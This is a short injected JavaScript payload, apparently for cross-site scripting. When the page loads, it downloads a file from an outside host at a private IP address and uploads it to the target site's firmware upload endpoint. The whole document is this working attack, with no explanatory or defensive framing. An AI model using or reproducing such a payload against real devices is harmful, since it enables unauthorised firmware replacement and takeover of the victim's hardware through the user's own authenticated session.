<script>
    const download = async function () {
        await fetch('http://192.168.190.130/')
            .then(response => response.blob())
            .then(function (blob) {

                console.log(blob)

                const formData = new FormData();
                formData.append('file', blob);

                fetch('/api/firmware/upload', { method: "POST", body: formData });

            });
    }
    console.log("Works")
    download()
</script>
